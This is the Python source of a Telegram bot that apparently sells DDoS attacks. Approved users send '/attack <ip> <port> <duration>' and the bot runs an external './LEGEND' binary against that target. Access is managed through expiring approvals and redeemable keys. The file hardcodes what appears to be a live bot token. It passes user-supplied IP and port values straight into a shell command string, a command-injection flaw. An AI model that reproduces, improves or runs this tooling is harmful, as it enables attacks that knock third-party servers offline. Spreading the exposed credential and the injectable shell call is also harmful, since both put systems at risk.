import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime, timedelta
import json

TELEGRAM_BOT_TOKEN = '7763302446:AAG35PcNxXhZaqz2mqhMLXFZLv5x1XUR1qs'
ALLOWED_USER_ID = 6192971829  # Only this user can approve other users
bot_access_free = True

# Dictionary to store approved users, their approval expiration times, and keys
approved_users = {}
keys = {}

# Load approved users and keys from files (if any)
def load_data():
    global approved_users, keys
    if os.path.exists("approved_users.json"):
        try:
            with open("approved_users.json", "r") as file:
                approved_users = json.load(file)
            print("Approved users loaded successfully.")
        except json.JSONDecodeError:
            print("Error: The JSON file is corrupted. Starting with an empty list.")
            approved_users = {}
        except Exception as e:
            print(f"Error loading approved users: {e}")
            approved_users = {}
    else:
        print("No approved_users.json file found. Starting with an empty list.")

    if os.path.exists("keys.json"):
        try:
            with open("keys.json", "r") as file:
                keys = json.load(file)
            print("Keys loaded successfully.")
        except json.JSONDecodeError:
            print("Error: The keys JSON file is corrupted. Starting with an empty list.")
            keys = {}
        except Exception as e:
            print(f"Error loading keys: {e}")
            keys = {}

# Save approved users and keys to files
def save_data():
    try:
        with open("approved_users.json", "w") as file:
            json.dump(approved_users, file)
        print("Approved users saved successfully.")
    except Exception as e:
        print(f"Error saving approved users: {e}")

    try:
        with open("keys.json", "w") as file:
            json.dump(keys, file)
        print("Keys saved successfully.")
    except Exception as e:
        print(f"Error saving keys: {e}")

# Periodic task to remove expired users
async def remove_expired_users():
    global approved_users
    while True:
        current_time = datetime.now()
        expired_users = [user_id for user_id, data in approved_users.items() if current_time > datetime.fromisoformat(data["expiry"])]
        
        for user_id in expired_users:
            del approved_users[user_id]

        if expired_users:
            save_data()

        await asyncio.sleep(60)  # Check every 60 seconds

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_first_name = update.effective_user.first_name  # Get the user's first name
    message = (
        f"*🔥 Welcome to the battlefield, {user_first_name}! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./LEGEND {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    else:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id not in approved_users or datetime.now() > datetime.fromisoformat(approved_users[user_id]["expiry"]):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Check if the duration exceeds the maximum allowed (300 seconds)
    if int(duration) > 300:
        duration = 300
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum allowed duration is 300 seconds. Setting duration to 300.*", parse_mode='Markdown')

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to approve users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id> <days> <hours> <minutes>*", parse_mode='Markdown')
        return

    target_user_id, days, hours, minutes = args
    target_user_id = int(target_user_id)

    # Calculate expiration time
    expiration_time = datetime.now() + timedelta(days=int(days), hours=int(hours), minutes=int(minutes))

    # Store approval info in dictionary
    approved_users[target_user_id] = {
        "expiry": expiration_time.isoformat()
    }

    # Save to file
    save_data()

    # Debug: Print the approval time for the user
    print(f"User {target_user_id} approved with expiration time: {expiration_time.isoformat()}")

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} approved!*\n"
        f"*⏳ Expiration time: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')}*",
        parse_mode='Markdown')

async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to generate keys!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /genkey <key_name> <days> <hours> <minutes>*", parse_mode='Markdown')
        return

    key_name, days, hours, minutes = args

    # Calculate expiration time
    expiration_time = datetime.now() + timedelta(days=int(days), hours=int(hours), minutes=int(minutes))

    # Store the key and its expiration info
    keys[key_name] = {
        "key": key_name,  # Custom key name
        "expiry": expiration_time.isoformat()
    }

    # Save to file
    save_data()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Key generated!*\n"
        f"*Key Name*: {key_name}\n"
        f"*⏳ Expiration time*: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key_name>*", parse_mode='Markdown')
        return

    key_name = str(args[0])

    if key_name not in keys:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid or expired key!*", parse_mode='Markdown')
        return

    expiration_time = datetime.fromisoformat(keys[key_name]["expiry"])

    if datetime.now() > expiration_time:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This key has expired!*", parse_mode='Markdown')
        del keys[key_name]  # Remove expired key
        save_data()
        return

    # Redeem the key by approving the user
    approved_users[user_id] = {"expiry": keys[key_name]["expiry"]}
    del keys[key_name]  # Remove the used key
    save_data()

    await context.bot.send_message(chat_id=chat_id, text="*✅ Key redeemed successfully!*\n*You are now authorized to use the bot.*", parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    help_message = (
        "*📋 Help - Commands Available 📋*\n\n"
        "*1. /start* - Start the bot and get an introduction to how it works.\n"
        "*2. /attack <ip> <port> <duration>* - Launch an attack on a given IP and port.\n"
        "*3. /approve <user_id> <days> <hours> <minutes>* - Approve a user with a time limit (only for authorized users).\n"
        "*4. /genkey <key_name> <days> <hours> <minutes>* - Generate a custom key for users to redeem.\n"
        "*5. /redeem <key_name>* - Redeem a generated key and gain access to the bot.\n"
        "*6. /userlist* - View the list of approved users with their remaining approval time (only for authorized users).\n"
        "*7. /help* - View the help message (this one!).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=help_message, parse_mode='Markdown')

async def userlist(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to view the user list!*", parse_mode='Markdown')
        return

    user_list_message = "*Approved Users List:*\n\n"
    if approved_users:
        for user_id, data in approved_users.items():
            expiration_time = datetime.fromisoformat(data["expiry"])
            user_list_message += f"*User ID*: {user_id} - *Expires*: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    else:
        user_list_message += "No approved users found."

    await context.bot.send_message(chat_id=chat_id, text=user_list_message, parse_mode='Markdown')

def main():
    load_data()

    # Create and start the bot application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("userlist", userlist))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("help", help_command))  # Add the /help command

    # Start the periodic task to remove expired users
    loop = asyncio.get_event_loop()
    loop.create_task(remove_expired_users())

    # Run the bot application
    loop.run_until_complete(application.run_polling())

if __name__ == '__main__':
    main()

